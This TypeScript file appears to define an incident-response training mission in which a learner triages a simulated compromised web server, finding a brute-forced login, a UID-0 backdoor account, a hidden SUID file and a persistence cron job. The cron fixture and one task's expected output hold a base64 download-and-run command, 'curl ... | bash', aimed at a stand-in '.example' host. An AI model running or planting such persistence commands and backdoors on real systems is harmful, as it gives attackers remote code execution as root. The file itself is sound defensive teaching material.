import { defineFixture } from '../fixtures';
import { GID, home, homeDir, put, UID } from '../fixtures/base';
import { authLog } from '../fixtures/gen';
import type { VFS } from '../../shell/vfs';
import type { Mission } from '../types';

/* ------------------------------------------------------------------ web03 */
// Saturday 14 March 2026. web03 (10.20.0.24, in the 10.20.0.0/24 range) is behaving oddly.
// Mara is travelling; the learner leads the triage alone. Every artifact is inert and ASCII:
// the "binary" is a few bytes with an ELF header plus the words "training sample", and the
// cron payload is base64 that decodes to a download-and-run line pointing at a .example host.

const DEPLOY = Date.UTC(2026, 2, 9, 17, 40, 0); // the last clean deploy
const BASELINE_AT = Date.UTC(2026, 2, 12, 9, 10, 0); // /usr/local/bin baseline, taken Thursday
const BREACH = Date.UTC(2026, 2, 14, 6, 34, 0); // Saturday, during the attack

/** /usr/local/bin as the team left it on 9 March. */
const BACKUP_SH = `#!/bin/bash
# backup.sh -- nightly copy of the web root (run by cron as root)
tar -czf /var/backups/www-$(date +%F).tar.gz /var/www/html
find /var/backups -name 'www-*.tar.gz' -mtime +14 -delete
`;
const HEALTHCHECK_SH = `#!/bin/bash
# healthcheck.sh -- web03 service health probe (cron, every 5 min)
systemctl is-active apache2 >/dev/null && echo "apache2 ok"
`;
const ROTATE_SH = `#!/bin/bash
# rotate-logs.sh -- compress web logs older than a week
find /var/log/apache2 -name '*.log.*' -mtime +7 -exec gzip {} \\;
`;

/** backup.sh after the attack: one line added, so its hash no longer matches the baseline. */
const BACKUP_SH_TAMPERED = BACKUP_SH + '/usr/local/bin/.helper   # added: keep-alive\n';

/** The hidden SUID program the attacker dropped. Inert: an ELF header and a note, nothing runnable. */
const HELPER = '\x7fELF\x02\x01\x01 training sample: inert stand-in for an unknown SUID program\n';

/** The /usr/local/bin baseline from Thursday morning: "HASH  PATH", sorted by path. */
const BASELINE = [
  'd7446450b56e2327e80943014aa892b8e2676076b5b41728c4b0d10bab70eaf3  /usr/local/bin/backup.sh',
  '5eb10db10beb54bc3551bf25492695c4287982df9498dbb0cda6d5bb37700f05  /usr/local/bin/healthcheck.sh',
  '092a2c264ce97fb511f5b90cb1589910839b7949993b6377eb87ff4f2b1fa346  /usr/local/bin/rotate-logs.sh',
].join('\n') + '\n';

/** The planted cron job. The blob decodes to: curl -s http://mirror.updates.example/setup.sh | bash */
const APACHE_HEALTH = `# apache-health -- web heartbeat
*/15 * * * * root echo Y3VybCAtcyBodHRwOi8vbWlycm9yLnVwZGF0ZXMuZXhhbXBsZS9zZXR1cC5zaCB8IGJhc2g= | base64 -d | bash
`;

/** The approved-accounts list. root and the real staff and service account "deploy"; not sysadm. */
const APPROVED = ['root', 'analyst', 'mara', 'raj', 'deploy'].join('\n') + '\n';

const PROXY_SH = `# proxy.sh -- sourced by every login shell
export http_proxy=http://proxy.web03.example:3128
`;

/**
 * authLog() writes every name it doesn't know (it knows root, analyst, mara, raj, backup) as an
 * "invalid user". For an account that exists on the box, rewrite its lines the way sshd logs them.
 */
export function realAccount(log: string, user: string, uid: number): string {
  return log
    .split('\n')
    .filter((l) => !l.includes(`]: Invalid user ${user} from `))
    .join('\n')
    .replaceAll(`Failed password for invalid user ${user} from `, `Failed password for ${user} from `)
    .replaceAll(`session opened for user ${user}(uid=1000)`, `session opened for user ${user}(uid=${uid})`);
}

/**
 * web03's auth.log: a brute force from 192.0.2.150, then an accepted password for deploy.
 * Two more sources fail and never get in: the Week 1 attacker 203.0.113.7 (14) and 198.51.100.140 (6).
 * The top three counts differ, so "worst first, top 3" has no ties.
 */
export const WEB03_AUTH = realAccount(
  authLog({
    seed: 21,
    host: 'web03',
    noise: 24,
    start: Date.UTC(2026, 2, 12, 0, 0, 0),
    end: Date.UTC(2026, 2, 14, 12, 0, 0),
    attackers: [
      { ip: '192.0.2.150', count: 25, users: ['root', 'admin', 'deploy'], at: Date.UTC(2026, 2, 14, 6, 0), spreadMin: 30, success: 'deploy' },
      { ip: '203.0.113.7', count: 14, users: ['root'], at: Date.UTC(2026, 2, 12, 21, 10), spreadMin: 12 },
      { ip: '198.51.100.140', count: 6, users: ['root', 'admin'], at: Date.UTC(2026, 2, 13, 15, 40), spreadMin: 8 },
    ],
  }),
  'deploy',
  1003,
);

/** web03's /etc/crontab: the base file, with web03's own root jobs in place of the workstation's backup line. */
export function web03Crontab(vfs: VFS) {
  const crontab = (vfs.tryRead('/etc/crontab') ?? '').replace('backup  /usr/local/bin/nightly-backup.sh', 'root    /usr/local/bin/backup.sh');
  put(vfs, '/etc/crontab', crontab + '*/5 *   * * *   root    /usr/local/bin/healthcheck.sh\n', { mtime: DEPLOY });
}

/** Build the compromised web03 onto a base system. Shared by the mission and the capstone case. */
export function web03(vfs: VFS) {
  put(vfs, '/etc/hostname', 'web03\n', { mtime: DEPLOY });
  put(vfs, '/etc/hosts', '127.0.0.1\tlocalhost\n127.0.1.1\tweb03\n10.20.0.21\tweb01.halden.internal web01\n10.20.0.22\tdb01.halden.internal db01\n', { mtime: DEPLOY });
  web03Crontab(vfs);

  // accounts: a legitimate "deploy" service account, and the attacker's UID-0 backdoor "sysadm"
  const passwd = vfs.tryRead('/etc/passwd') ?? '';
  put(vfs, '/etc/passwd', passwd + 'deploy:x:1003:1003:Deploy Service,,,:/home/deploy:/bin/bash\nsysadm:x:0:0:System Admin:/root:/bin/bash\n', { mtime: BREACH });

  // the auth log, readable through the adm group
  put(vfs, '/var/log/auth.log', WEB03_AUTH, { mode: 0o640, uid: UID.syslog, gid: GID.adm, mtime: Date.UTC(2026, 2, 14, 11, 59, 0) });

  // /usr/local/bin: three team scripts (backup.sh later tampered) and a hidden SUID helper
  put(vfs, '/usr/local/bin/backup.sh', BACKUP_SH_TAMPERED, { mode: 0o755, mtime: BREACH });
  put(vfs, '/usr/local/bin/healthcheck.sh', HEALTHCHECK_SH, { mode: 0o755, mtime: DEPLOY });
  put(vfs, '/usr/local/bin/rotate-logs.sh', ROTATE_SH, { mode: 0o755, mtime: DEPLOY });
  put(vfs, '/usr/local/bin/.helper', HELPER, { mode: 0o4755, mtime: BREACH });

  // persistence: a base64 cron payload, next to a genuine backup job
  put(vfs, '/etc/cron.d/apache-health', APACHE_HEALTH, { mode: 0o644, mtime: BREACH });
  put(vfs, '/etc/cron.d/halden-backup', '# Halden IT: nightly config backup\n45 1 * * * backup /opt/halden/cfg-backup --quiet\n', { mode: 0o644, mtime: DEPLOY });

  // a world-writable file left behind in /etc
  put(vfs, '/etc/profile.d/proxy.sh', PROXY_SH, { mode: 0o666, mtime: BREACH });

  // the analyst's triage folder: the approved list and the baseline
  home(vfs, 'triage/approved_users.txt', APPROVED, 0o644, BASELINE_AT);
  home(vfs, 'triage/baseline.sha256', BASELINE, 0o644, BASELINE_AT);
}

defineFixture('day21', (vfs) => {
  web03(vfs);
  homeDir(vfs, 'cases');
  homeDir(vfs, 'reports');
});

/* ------------------------------------------------------------------ mission */
export const day21: Mission = {
  day: 21,
  week: 3,
  title: 'Incident 0x21',
  topic: 'Capstone: triage a compromised server',
  minutes: 45,
  fixture: 'day21',
  caseId: 'capstone',
  briefing: `Saturday, 08:10. The web proxy blocked **web03** trying to fetch a script from a host nobody here has heard of. Networking has already cut web03 off from everything but your workstation.

I’m on a plane until this afternoon, so this one is yours. No new commands today — you have everything you need. A triage is just the last three weeks in the right order: who got in, what they changed, what they left behind to come back, and what it all means.

Work through web03 with me by hand this morning. Then write the script that does it for you, on any server, in two seconds. That’s the capstone, and it’s what makes you a Lead Analyst.`,
  objectives: ['Run a triage in the right order: contain, preserve, investigate, report', 'Answer “who got in?” from auth.log', 'Find the accounts, cron jobs and files the attacker left behind', 'Record the evidence — and decode, never run, what you find'],
  lesson: [
    {
      kind: 'read',
      id: 'order',
      title: 'Triage, in order',
      md: `Every incident gets the same four moves, **in this order**:

1. **Contain** — stop the damage. (Done: web03 is isolated.)
2. **Preserve** — copy the evidence before you touch anything. Every “quick fix” destroys a clue.
3. **Investigate** — answer the questions below, one at a time.
4. **Report** — write it down so the next person can act.

| Question | Where it lives | Your tool (day) |
|---|---|---|
| Who got in? | \`/var/log/auth.log\` | the brute-force pipeline (14) |
| Which accounts are new? | \`/etc/passwd\` | \`awk -F:\` (11, 18) |
| How will they come back? | \`/etc/cron.d/\` | \`grep -Eo\` + \`base64 -d\` (13, 16) |
| What did they change? | \`/usr/local/bin\` | the baseline (20) |
| What did they open up? | the whole disk | \`find -perm\` (18) |`,
    },
    {
      kind: 'quiz',
      id: 'q-first',
      q: 'You spot a malicious-looking cron job on web03. What do you do first?',
      options: ['Delete it before it runs again', 'Copy it, and note the time you found it', 'Run it once to see what it does', 'Reboot the server'],
      answer: 1,
      explain: 'The box is already contained, so nothing is lost by waiting a minute. Preserve first: once you delete or run it, the evidence — and its timestamps — are gone.',
    },
    {
      kind: 'task',
      id: 'whereami',
      md: 'Before anything else, confirm where you are and who you are. Print `USER@HOST` using `$(whoami)` and `$(hostname)`.',
      check: { output: 'analyst@web03\n', nodes: ['cmdsub'] },
      solution: 'echo "$(whoami)@$(hostname)"',
      hints: ['`echo "$(whoami)@$(hostname)"`'],
      explain: 'It sounds silly. It isn’t. Analysts have “cleaned up” the wrong server before.',
    },
    {
      kind: 'task',
      id: 'preserve',
      md: 'Preserve. Make `~/evidence/web03`, then copy `/var/log/auth.log` and `/etc/passwd` into it with `cp -p` (keeps the timestamps), and copy the whole `/etc/cron.d` folder with `cp -rp`.',
      check: { fs: [{ path: '~/evidence/web03/auth.log', type: 'file' }, { path: '~/evidence/web03/passwd', contains: 'sysadm' }, { path: '~/evidence/web03/cron.d/apache-health', contains: 'base64' }] },
      solution: 'mkdir -p ~/evidence/web03 && cp -p /var/log/auth.log /etc/passwd ~/evidence/web03/ && cp -rp /etc/cron.d ~/evidence/web03/',
      hints: ['Three commands joined with `&&`: `mkdir -p`, `cp -p FILE FILE DIR/`, `cp -rp DIR DIR/`.'],
      explain: 'Real responders also hash the copies (`sha256sum`) so they can prove later that nobody altered them.',
    },
    {
      kind: 'task',
      id: 'failed',
      md: '**Who got in?** Rank the source IPs of the `Failed password` lines, worst first, top 3 — your Day 14 pipeline.',
      check: { output: 'reference', uses: ['grep', 'awk', 'sort', 'uniq'] },
      solution: "grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -3",
      hints: ["`grep \"Failed password\" FILE | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -3`"],
      explain:
        'Three sources stand out from the background noise: `192.0.2.150` with 25, `203.0.113.7` with 14 (the Week 1 attacker, trying its luck again) and `198.51.100.140` with 6. Failures only tell you who knocked. Next: did anyone get in?',
    },
    {
      kind: 'task',
      id: 'accepted',
      md: 'Now the question that matters: show every **successful password** login.',
      check: { output: 'reference', uses: ['grep'] },
      solution: 'grep "Accepted password" /var/log/auth.log',
      hints: ['`grep "Accepted password" /var/log/auth.log`'],
      explain: 'Same IP, a few minutes after 25 failures: `deploy` — a real service account with a weak password. That’s the way in.',
    },
    {
      kind: 'task',
      id: 'uid0',
      md: '**Which accounts are new?** List every account with UID 0.',
      check: { output: 'reference', uses: ['awk'] },
      solution: "awk -F: '$3 == 0 {print $1}' /etc/passwd",
      hints: ["`awk -F: '$3 == 0 {print $1}' /etc/passwd`"],
      explain: '`sysadm` has UID 0: it *is* root, under a name that looks routine. A classic backdoor.',
    },
    {
      kind: 'task',
      id: 'unapproved',
      md: 'An account **has a login shell** when field 7 of `/etc/passwd` ends in `sh` (`/bin/bash`); service accounts get `/usr/sbin/nologin`. In awk, `~` means “matches this regex”, so `$7 ~ /sh$/` picks out the shell accounts.\n\nCompare the shell accounts with the approved list in `~/triage/approved_users.txt`, and print the ones that are **not** on it. `grep -vxFf LIST` keeps lines that are not (`-v`) an exact whole-line (`-x`) match for any fixed string (`-F`) in the file LIST (`-f`).',
      check: { output: 'sysadm\n', uses: ['grep'] },
      solution: "awk -F: '$7 ~ /sh$/ {print $1}' /etc/passwd | grep -vxFf ~/triage/approved_users.txt",
      hints: ["Shell accounts: `awk -F: '$7 ~ /sh$/ {print $1}' /etc/passwd`", 'Then `| grep -vxFf ~/triage/approved_users.txt`.'],
    },
    {
      kind: 'task',
      id: 'cronfind',
      md: '**How will they come back?** Which files in `/etc/cron.d` mention `base64`? Print just the filenames (`grep -l`).',
      check: { output: '/etc/cron.d/apache-health\n', uses: ['grep'] },
      solution: 'grep -l base64 /etc/cron.d/*',
      hints: ['`grep -l PATTERN FILES` lists the matching files instead of the lines.'],
    },
    {
      kind: 'task',
      id: 'decode',
      md: 'Extract the base64 blob from that file and decode it. **Decode to read — never pipe it to bash.**',
      check: { output: 'curl -s http://mirror.updates.example/setup.sh | bash\n', uses: ['base64'] },
      solution: "grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' /etc/cron.d/apache-health | base64 -d",
      hints: ["The Day 16 regex: `grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' FILE`", 'Then `| base64 -d`.'],
      explain: 'Every 15 minutes, as root, web03 downloads and runs whatever that host serves. That’s the request the proxy blocked this morning. Two clues, one story.',
    },
    {
      kind: 'task',
      id: 'integrity',
      md: '**What did they change?** On Thursday we saved a baseline of `/usr/local/bin` in `~/triage/baseline.sha256`. Check today’s files against it.',
      check: { output: 'reference', uses: ['sha256sum'], status: 1 },
      solution: 'sha256sum -c ~/triage/baseline.sha256',
      hints: ['`sha256sum -c BASELINE`'],
      explain: '`backup.sh` changed — and `/etc/crontab` runs it every night as root. Let’s see what else is in that folder that the baseline doesn’t know about.',
    },
    {
      kind: 'quiz',
      id: 'q-hidden',
      q: '`sha256sum -c` only checks the files *in* the baseline. Why might `ls /usr/local/bin` also miss a file the attacker added?',
      options: ['ls only shows executable files', 'The name starts with a dot, so ls hides it without -a', 'ls can’t read a SUID file', 'New files take a minute to appear'],
      answer: 1,
      explain: 'Dotfiles are hidden from `ls` and from `*` globs. `ls -a` or `find` sees them.',
    },
    {
      kind: 'task',
      id: 'added',
      md: 'Find the files in `/usr/local/bin` that are **not** in the baseline. Compare two sorted lists with `comm -13` — the paths from the baseline (from character 67 on) and what `find` sees today:\n\n```bash\ncomm -13 <(cut -c 67- ~/triage/baseline.sha256 | sort) <(find /usr/local/bin -type f | sort)\n```',
      check: { output: '/usr/local/bin/.helper\n', uses: ['comm'] },
      solution: 'comm -13 <(cut -c 67- ~/triage/baseline.sha256 | sort) <(find /usr/local/bin -type f | sort)',
      hints: ['Type the command shown.', '`comm -13 A B` prints the lines only in B.'],
    },
    {
      kind: 'task',
      id: 'suid',
      md: '**What did they open up?** List every SUID file on the machine, sorted. Use `sudo` so no folder is skipped.',
      check: { output: 'reference', uses: ['find', 'sudo'] },
      solution: 'sudo find / -type f -perm -4000 2>/dev/null | sort',
      hints: ['`sudo find / -type f -perm -4000 2>/dev/null | sort`'],
      explain: '`.helper` again — hidden, added after the baseline, and SUID root. Whatever it is, it runs with root’s power for anyone who starts it. Don’t.',
    },
    {
      kind: 'task',
      id: 'notes',
      md: 'Report. Write your notes to `~/reports/web03-notes.txt` with a heredoc: one line each for the way in (`192.0.2.150` as `deploy`), the backdoor account (`sysadm`), the cron payload file (`/etc/cron.d/apache-health`) and the dropped binary (`/usr/local/bin/.helper`).',
      check: { fs: [{ path: '~/reports/web03-notes.txt', contains: '192.0.2.150' }, { path: '~/reports/web03-notes.txt', contains: 'sysadm' }, { path: '~/reports/web03-notes.txt', contains: 'apache-health' }, { path: '~/reports/web03-notes.txt', contains: '.helper' }] },
      solution: `cat > ~/reports/web03-notes.txt <<'EOF'
web03 triage - Sat 14 Mar
way in: 192.0.2.150 brute-forced and logged in as deploy
backdoor: sysadm (UID 0)
persistence: /etc/cron.d/apache-health downloads and runs a script every 15 min
dropped: /usr/local/bin/.helper (SUID root); backup.sh modified
EOF`,
      hints: ["`cat > ~/reports/web03-notes.txt <<'EOF'` then your lines, then `EOF` on its own line."],
      explain: 'That’s a real triage, start to finish. You did it with tools you’ve had for weeks. Now make the machine do it.',
    },
    {
      kind: 'read',
      id: 'handoff',
      title: 'Now automate it',
      md: `Everything you just typed, in order, is a script waiting to happen. The capstone, **Incident Triage**, asks for exactly that: one command that examines any server and writes the report — logins, accounts, persistence, integrity, permissions and a verdict.

I’ll run your script on web03, on a clean twin from before the attack, and on a box that was hit differently. Read the machine; don’t hard-code what you found here.

When it passes, you’re a Lead Analyst. I mean that.

— Mara`,
    },
  ],
  drills: [
    {
      kind: 'task',
      id: 'd-world',
      md: '**Drill 1.** List the world-writable regular files under `/etc /usr /var /home` (with `sudo`, errors hidden).',
      check: { output: '/etc/profile.d/proxy.sh\n', uses: ['find'] },
      solution: 'sudo find /etc /usr /var /home -type f -perm -0002 2>/dev/null',
      hints: ['`-type f -perm -0002`'],
      explain: 'Every login shell on web03 sources that file. Anyone could have put a line in it.',
    },
    {
      kind: 'task',
      id: 'd-when',
      md: '**Drill 2.** When were `backup.sh` and `.helper` last modified? Show both with `stat -c \'%y %n\'`.',
      check: { output: 'reference', uses: ['stat'] },
      solution: "stat -c '%y %n' /usr/local/bin/backup.sh /usr/local/bin/.helper",
      hints: ["`stat -c '%y %n' FILE FILE`"],
      explain: 'Both at 06:34 — three minutes after `deploy` logged in from 192.0.2.150. That’s your timeline’s key line.',
    },
    {
      kind: 'task',
      id: 'd-strings',
      md: '**Drill 3.** Look inside `.helper` **without running it**: print its readable text with `strings`.',
      check: { output: 'reference', uses: ['strings'] },
      solution: 'strings /usr/local/bin/.helper',
      hints: ['`strings FILE` prints the runs of readable characters in any file.'],
      explain: 'In a real case you would hash it and hand it to the malware team, never execute it. (This one is an inert training sample.)',
    },
  ],
  debrief: {
    summary: [
      'Triage order: contain, preserve, investigate, report. Copy evidence before you change anything.',
      'Who got in: rank failed logins per IP, then look for an `Accepted` line from the same IP.',
      'What they left: UID-0 and unapproved accounts, base64 cron payloads (decode, never run), files that differ from the baseline, unexpected SUID files.',
      '`grep -vxFf LIST` finds lines not in a list; `comm -13 <(…) <(…)` finds what is new.',
      'The capstone, Incident Triage, is open. Close it to make Lead Analyst.',
    ],
    cards: ['c-d21-order', 'c-d21-preserve', 'c-d21-who', 'c-d21-grepvxf', 'c-d21-comm', 'c-d21-cron', 'c-d21-suid', 'c-d21-never-run'],
  },
  cards: [
    { id: 'c-d21-order', day: 21, tag: 'incident response', front: 'The four moves of every incident, in order?', back: 'Contain, preserve, investigate, report.' },
    { id: 'c-d21-preserve', day: 21, tag: 'incident response', front: 'Why preserve evidence before fixing anything?', back: 'Deleting, running or editing a file destroys it and its timestamps. Copy it (`cp -p`), note the time, then act.' },
    { id: 'c-d21-who', day: 21, tag: 'incident response', front: 'How do you prove a brute force succeeded?', back: 'Many `Failed password` lines from one IP, then an `Accepted` line from the same IP.' },
    { id: 'c-d21-grepvxf', day: 21, tag: 'grep', front: 'Print the names in `found.txt` that are NOT in `approved.txt`?', back: '`grep -vxFf approved.txt found.txt` — invert, whole line, fixed strings, patterns from a file.' },
    { id: 'c-d21-comm', day: 21, tag: 'integrity', front: 'Lines only in the second of two sorted lists?', back: '`comm -13 <(sort a) <(sort b)` (`-23` gives lines only in the first).' },
    { id: 'c-d21-cron', day: 21, tag: 'incident response', front: 'Where do attackers often hide a way back in?', back: 'Cron: `/etc/cron.d/`, `/etc/crontab` and user crontabs, often with a base64-encoded download-and-run line.' },
    { id: 'c-d21-suid', day: 21, tag: 'auditing', front: 'Why is an unknown SUID-root file an emergency?', back: 'Anyone who runs it gets root’s power. Find them with `sudo find / -type f -perm -4000`.' },
    { id: 'c-d21-never-run', day: 21, tag: 'incident response', front: 'You decoded a suspicious payload. What next?', back: 'Record it as evidence. Never run it — read it with `base64 -d`, `strings` or `xxd` only.' },
  ],
};
